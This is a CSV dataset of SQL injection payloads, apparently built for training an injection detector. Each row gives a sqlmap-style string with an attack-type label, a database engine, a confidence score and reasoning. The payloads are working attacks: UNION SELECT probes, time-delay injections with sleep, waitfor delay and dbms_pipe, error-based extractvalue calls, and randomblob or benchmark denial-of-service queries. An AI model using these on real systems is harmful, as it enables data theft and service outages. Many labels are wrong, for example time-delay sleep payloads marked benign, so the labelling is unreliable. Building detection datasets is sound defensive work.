id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
23571,-2036' ) or ( 8459 = 8459 ) *6703 and ( 'hjeu' = 'hjeu,benign,generic,0.55,"Conflict: Rule shows boolean (OR condition), Heuristic shows benign. Arithmetic multiplication with comparison but weak attack pattern overall.",1
23572,"1, ( select ( case when ( 5217 = 5217 ) then 1 else 5217* ( select 5217 from mysql.db ) end ) )",boolean_blind,generic,0.65,"Conflict: Rule labels error_based, Heuristic shows boolean. No explicit error function (updatexml/extractvalue missing). Boolean classification conservative.",1
23573,"-8923'+ ( select xgvz where 9858 = 9858 union all select 9858,9858,9858#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 3 identical columns.",2
23574,"1"" ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""hsaw"" = ""hsaw",heavy_query,sqlite,0.75,"Heuristic: DoS-style with 500000000. SQLite randomblob time attack but marked heavy_query due to computational intensity.",1
23575,"1 where 8389 = 8389 union all select null,null,null,null,null,null,null,null,null,null#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 10 NULL columns.",2
23576,"1"" ) rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and ( ""kxws"" like ""kxws",boolean_blind,mysql,0.65,"Conflict: Rule shows rlike (P3 boolean_blind), Heuristic shows boolean. MySQL RLIKE regex matching for boolean-based detection.",1
23577,"1'|| ( select 'ycya' from dual where 3536 = 3536 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,oracle,0.75,"Conflict: Rule shows randomblob (sqlite time), Heuristic shows heavy_query DoS (500000000). Oracle context from 'dual' table + large computation.",1
23578,"1"" ) where 9680 = 9680 and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",heavy_query,mysql,0.75,"Heuristic: DoS-style with 8446744073709551610 huge number. Conflict: Rule shows error_based but large number indicates computational attack. Heavy_query (P4).",1
23579,"-1772 ) ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 8904 = 8904",boolean_blind,generic,0.65,"Conflict: Rule shows error_based (CONVERT), Heuristic shows boolean. No clear error function trigger. Boolean structure dominates. Generic DB.",1
23580,"1%"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,0.90,"Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle. Oracle pipe messaging for time-based blind SQLi.",2
23581,"1%"" and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""%"" = """,heavy_query,mysql,0.75,"Heuristic: DoS-style payload. Conflict: Rule shows error_based but heavy_query marked due to complex nested structure with computational load.",1
23582,1'+ ( select hett where 7228 = 7228,boolean_blind,generic,0.65,"Conflict: Rule shows union_based, Heuristic shows boolean. SELECT without UNION keyword → generic structure. Boolean classification chosen (P3 < P7).",1
23583,"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and 'idxa' = 'idxa",heavy_query,mysql,0.75,"Heuristic: DoS-style with nested UNION SELECT. Rule shows error_based but computational complexity + large numbers → heavy_query (P4).",1
23584,"1"" ) ) rlike ( select ( case when ( 8179 = 1246 ) then 1 else 0x28 end ) ) and ( ( ""xxeu"" = ""xxeu",boolean_blind,mysql,0.65,"Conflict: Rule shows time_blind, Heuristic shows boolean. MySQL RLIKE function for pattern matching → boolean (P3 beats P5).",1
23585,-9072 ) as saot where 2278 = 2278 order by 1#,benign,generic,0.55,"Rule: no attack signal. ORDER BY 1 is standard SQL ordering, not injection. Weak attack indicators despite unusual structure.",1
23586,select ( case when ( 1093 = 7693 ) then 1093 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.65,"Confidence raised from 0.50. Boolean comparison 1093 = 7693 with division by zero fallback shows boolean-based logic.",1
23587,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5--",boolean_blind,generic,0.65,"Conflict: Rule shows heavy_query, Heuristic shows boolean. Multiple table joins for counting but without complex computation. Conservative generic.",1
23588,"1%' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and '%' = '",heavy_query,mysql,0.75,"Heuristic: DoS-style with huge number 8446744073709551610. Complex nested structure. Marked heavy_query despite error_based conflict.",1
23589,"1%"" ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( ""%"" = """,heavy_query,mysql,0.75,"Conflict: Rule shows error_based (extractvalue), Heuristic shows heavy_query. Benchmark(5000000) + huge computation indicates DoS. Heavy_query (P4).",1
23590,"1' ) ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( ( 'ymad' like 'ymad",heavy_query,mysql,0.75,"Heuristic: DoS-style payload. Conflict: Rule shows error_based but heavy computation + system table enumeration → heavy_query (P4).",1
23591,"1' where 2202 = 2202 and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.65,"Conflict: Rule shows heavy_query, Heuristic shows boolean. Multiple table join enumeration. Conservative: boolean_blind (P3) over heavy_query (P4).",1
23592,"1 ) where 3915 = 3915 union all select null,null,null,null#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 4 NULL columns.",2
23593,"-7808"" ) ) as jgkk where 9230 = 9230 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.65,"Both sources agree boolean_blind (P3). MySQL ELT function for conditional boolean matching.",1
23594,"-7514%"" ) ) ) or 2448 = 8797#",boolean_blind,generic,0.65,"Confidence raised from 0.50. Boolean comparison 2448 = 8797 shows boolean injection pattern.",1
23595,"-8758' union all select 6885,6885,6885,6885,6885,6885,6885,6885--",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 8 identical columns.",2
23596,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.75,"Heuristic: DoS-style with 500000000. SQLite randomblob for time attack but marked heavy_query due to computational load.",1
23597,1' ) ) as bswc where 1635 = 1635 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,boolean_blind,oracle,0.65,"Conflict: Rule shows out_of_band, Heuristic shows boolean. dbms_utility is Oracle-specific but function context shows boolean evaluation.",1
23598,"1"" where 8387 = 8387",benign,generic,0.55,"Rule: no attack signal. Simple equality test 8387 = 8387. Very weak or no injection pattern.",1
23599,"1'|| ( select 'jzwq' where 3289 = 3289 union all select null,null,null,null,null,null,null#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 7 NULL columns.",2
23600,"1, ( select ( case when ( 7711 = 7711 ) then 1 else 7711* ( select 7711 from information_schema.character_sets ) end ) )",boolean_blind,mysql,0.65,"Conflict: Rule shows error_based, Heuristic shows boolean. CASE statement with boolean logic dominates. Boolean_blind (P3) chosen.",1
23601,"1%' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( '%' = '",time_blind,oracle,0.90,"Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle. Oracle pipe blocking call for time-based attack.",2
23602,1' ) as zmvn where 2887 = 2887 union all select null--,union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 1 NULL column.",2
23603,"1' ) and elt ( 1210 = 1210,sleep ( 5 ) ) and ( 'medg' = 'medg",benign,mysql,0.55,"Conflict: Rule shows time_blind, Heuristic shows benign. ELT boolean context dominates; sleep is misleading. Conservative benign.",1
23604,"1' ) where 4092 = 4092 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",heavy_query,generic,0.75,"Heuristic: DoS-style with 500000000. Complex nested string function with heavy computation. Heavy_query (P4) despite boolean structure.",1
23605,"1' ) ) ) union all select null,null,null,null#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 4 NULL columns.",2
23606,1' ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 'cuav' = 'cuav,boolean_blind,generic,0.65,"Conflict: Rule shows error_based, Heuristic shows boolean. IN clause with CASE boolean logic. Boolean_blind (P3) chosen.",1
23607,"1%' ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.75,"Heuristic: DoS-style with 500000000. SQLite randomblob time attack marked heavy_query due to computational load.",1
23608,"1',iif ( 7475 = 7475,1,1/0 )",benign,generic,0.55,"Conflict: Rule shows boolean_blind, Heuristic shows benign. IIF function with division by zero but weak overall attack pattern.",1
23609,"1' ) ) ) union all select null,null--",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 2 NULL columns.",2
23610,"-2316%' union all select 8636,8636,8636,8636,8636,8636,8636--",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 7 identical columns.",2
23611,"-5617 ) where 2132 = 2132 union all select 2132,2132,2132,2132#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 4 identical columns.",2
23612,1' ) and sleep ( 5 ),benign,mysql,0.55,"Conflict: Rule shows time_blind, Heuristic shows benign. Sleep outside conditional context; weak attack pattern overall.",1
23613,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ""vcup"" = ""vcup",boolean_blind,generic,0.65,"Conflict: Rule shows heavy_query, Heuristic shows boolean. Table join enumeration but without explicit DoS indicators. Conservative generic.",1
23614,"1"" ) as yzzk where 1813 = 1813 and ( 3020 = 3020 ) *6703--",boolean_blind,generic,0.65,"Confidence raised from 0.50. Boolean equality test with arithmetic operation shows boolean injection pattern.",1
23615,"1'+ ( select mkbv where 1648 = 1648 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.65,"Conflict: Rule shows heavy_query, Heuristic shows boolean. Firebird system table enumeration. Multiple joins but conservative classification: boolean (P3).",1
23616,-7600' or 7684 = 3181#,boolean_blind,generic,0.65,"Confidence raised from 0.50. Boolean comparison 7684 = 3181 with OR shows boolean-based SQLi pattern.",1
23617,"1"" ) waitfor delay '0:0:5' and ( ""vjpg"" = ""vjpg",time_blind,mssql,0.90,"Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql. MSSQL-specific WAITFOR function for time-based blind SQLi.",2
23618,-1769 union all select 6054--,union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 1 column.",2
23619,"1%"" ) ) rlike ( select ( case when ( 4207 = 1757 ) then 1 else 0x28 end ) ) and ( ( ""%"" = """,boolean_blind,mysql,0.65,"Conflict: Rule shows time_blind, Heuristic shows boolean. MySQL RLIKE for regex matching shows boolean pattern (P3 beats P5).",1
23620,1 ) ) as bsvo where 3605 = 3605,benign,generic,0.55,"Rule: no attack signal. Simple equality test 3605 = 3605. Very weak attack pattern.",1
23621,"1 ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 6986 = 6986",heavy_query,mysql,0.75,"Both sources show heavy_query. Extractvalue with large hex strings + nested subquery. Marked heavy_query due to computational structure.",1
23622,"1%"" ) or sleep ( 5 ) and ( ""%"" = """,benign,mysql,0.55,"Conflict: Rule shows time_blind, Heuristic shows benign. Sleep outside primary injection context; weak overall pattern.",1
23623,"-6815 ) where 2498 = 2498 union all select 2498,2498,2498,2498,2498--",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 5 identical columns.",2
23624,"1' ) ) as anaq where 9605 = 9605 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.65,"Both sources agree: boolean_blind (P3). MySQL ELT function for conditional boolean logic.",1
23625,1'+ ( select smze where 5616 = 5616,boolean_blind,generic,0.65,"Conflict: Rule shows union_based, Heuristic shows boolean. SELECT without UNION keyword. Boolean classification (P3 beats P7).",1
23626,"1%"" ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.75,"Heuristic: DoS-style with 500000000. SQLite randomblob with large computation. Heavy_query (P4) due to computational load.",1
23627,"1' where 2373 = 2373 union all select null,null#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 2 NULL columns.",2
23628,"1' ) ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.90,"Pattern match: 'dbms_pipe.receive_message' → time_blind (P5); DB signature: oracle. Oracle pipe messaging for time-based blind SQLi.",2
23629,1' ) and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) and ( 'xazf' = 'xazf,boolean_blind,generic,0.65,"Conflict: Rule shows time_blind, Heuristic shows boolean. CAST+CASE shows boolean logic structure. Boolean_blind (P3) chosen.",1
23630,"-7126' ) ) as fzpp where 8078 = 8078 union all select 8078,8078,8078,8078,8078,8078,8078#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 7 identical columns.",2
23631,1' rlike sleep ( 5 ),boolean_blind,mysql,0.65,"Conflict: Rule shows time_blind, Heuristic shows boolean. MySQL RLIKE boolean context dominates (P3 beats P5).",1
23632,"-8448%"" or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ""%"" = """,boolean_blind,oracle,0.65,"Conflict: Rule shows out_of_band, Heuristic shows boolean. dbms_utility context with boolean evaluation. Oracle-specific function but boolean structure.",1
23633,"1"" ) where 8571 = 8571 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.65,"Both sources agree: boolean_blind (P3). MySQL ELT function for conditional logic.",1
23634,select ( case when ( 4059 = 7807 ) then 4059 else 1/ ( select 0 ) end ) --,boolean_blind,generic,0.65,"Confidence raised from 0.50. Boolean comparison 4059 = 7807 with conditional logic shows boolean-based pattern.",1
23635,-9809' order by 1--,benign,generic,0.55,"Rule: no attack signal. ORDER BY is standard SQL clause, not injection. Weak attack indicators.",1
23636,"-9008' ) union all select 4976,4976,4976,4976#",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 4 identical columns.",2
23637,"( updatexml ( 8862,concat ( 0x2e,0x7171706a71, ( select ( elt ( 8862 = 8862,1 ) ) ) ,0x717a767a71 ) ,8981 ) )",heavy_query,mysql,0.75,"Heuristic: DoS-style. Conflict: Rule shows error_based but heavy computation pattern. MySQL updatexml with large payload.",1
23638,"-4745"" or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ""nifq"" like ""nifq",boolean_blind,firebird,0.65,"Conflict: Rule shows heavy_query, Heuristic shows boolean. Firebird rdb$database system table. Boolean structure dominates (P3).",1
23639,"1"" ) as hymr where 5497 = 5497 union all select null,null,null,null--",union_based,generic,0.85,"Pattern match: 'union all select' → union_based (P7); DB signature: generic. UNION SELECT with 4 NULL columns.",2
23640,"1', ( select ( case when ( 5217 = 5217 ) then 1 else 5217* ( select 5217 from mysql.db ) end ) )",boolean_blind,generic,0.65,"Conflict: Rule shows error_based, Heuristic shows boolean. CASE statement with boolean logic. MySQL.db system table reference but generic overall.",1
23641,"1 and elt ( 1210 = 1210,sleep ( 5 ) ) # macc",benign,mysql,0.55,"Conflict: Rule shows time_blind, Heuristic shows benign. ELT boolean context; sleep is secondary. Conservative benign classification.",1
23642,"1 and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,generic,0.65,"Conflict: Rule shows heavy_query, Heuristic shows boolean. Multiple table joins with counting but no explicit DoS. Boolean (P3) conservative.",1
